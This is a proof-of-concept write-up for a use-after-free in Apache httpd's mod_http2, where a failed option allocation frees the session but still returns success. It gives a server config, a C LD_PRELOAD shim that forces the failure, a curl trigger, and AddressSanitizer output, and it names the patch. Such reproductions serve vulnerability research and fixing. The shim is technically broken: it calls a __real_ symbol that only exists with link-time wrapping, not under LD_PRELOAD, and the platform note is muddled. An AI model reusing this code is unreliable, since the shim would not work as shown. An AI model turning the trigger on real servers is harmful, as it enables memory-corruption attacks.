# PoC 065 - Option Allocation Failure Returns Success

`h2_session_create()` stashes the new session pointer in `*psession`, then on
`nghttp2_option_new()` failure destroys the session pool but still returns
`APR_SUCCESS`. The caller dereferences the freed pointer.

## Setup

Vulnerable httpd 2.4.66 with mod_http2 over TLS. Because `nghttp2_option_new`
practically only fails on allocation failure, this PoC uses a tiny shim
library to deterministically force the failure rather than relying on a
real OOM.

`conf/httpd.conf`:

```
ServerName 127.0.0.1
Listen 127.0.0.1:8443
LoadModule ssl_module    modules/mod_ssl.so
LoadModule http2_module  modules/mod_http2.so
Protocols h2 http/1.1
SSLEngine on
SSLCertificateFile    /tmp/poc065/cert.pem
SSLCertificateKeyFile /tmp/poc065/key.pem
DocumentRoot /tmp/poc065/docroot
<Directory /tmp/poc065/docroot>
    Require all granted
</Directory>
```

Generate cert / docroot, then build a `LD_PRELOAD` shim that returns
nonzero from `nghttp2_option_new` on the first call:

```c
/* /tmp/poc065/shim.c */
#include <stddef.h>
int nghttp2_option_new(void **out) {
    static int n = 0;
    if (n++ == 0) return -901;     /* NGHTTP2_ERR_NOMEM */
    /* fall through to real symbol */
    extern int __real_nghttp2_option_new(void **);
    return __real_nghttp2_option_new(out);
}
```

```
gcc -shared -fPIC /tmp/poc065/shim.c -o /tmp/poc065/shim.so
```

Platform note: on Linux, use `-Wl,--wrap=nghttp2_option_new` and link with
`-Wl,--wrap`; alternatively rebuild httpd with a debug `nghttp2` whose
`option_new` returns `NGHTTP2_ERR_NOMEM` after N invocations. macOS users
can use `DYLD_INSERT_LIBRARIES` and `__interpose`.

## Trigger

```
LD_PRELOAD=/tmp/poc065/shim.so httpd -X -f $PWD/conf/httpd.conf &

# Speak h2 - any HTTPS request that negotiates h2 reaches h2_session_create.
curl -sk --http2-prior-knowledge https://127.0.0.1:8443/ >/dev/null
```

## Observed effect

Instrumented run (ASan or `mtrace`) shows the shape of the bug:

```
[mpm_event:notice] AH00489: Apache/2.4.66 configured
[http2:error] AH02928: nghttp2_option_new: out of memory
==pid==ERROR: AddressSanitizer: heap-use-after-free
   READ of size 8 at 0x... (h2_conn_ctx.c:71 in apr_psprintf)
   freed by thread T0 here:
     apr_pool_destroy
     h2_session_create  modules/http2/h2_session.c:1028
   previously allocated by:
     apr_pool_create_ex
     h2_session_create  modules/http2/h2_session.c:943
```

The chain is exactly as documented: `*psession = session` was set at
`h2_session.c:950`, the session pool was destroyed at `:1028`, but the
function returned `status` (still `APR_SUCCESS`); `h2_c1_setup()` accepted
the success and `h2_conn_ctx_assign_session()` dereferenced the freed
pointer at `h2_conn_ctx.c:71` while building a debug log string. With the
patch (`return APR_EGENERAL`) the caller bails out cleanly and the UAF is
gone.
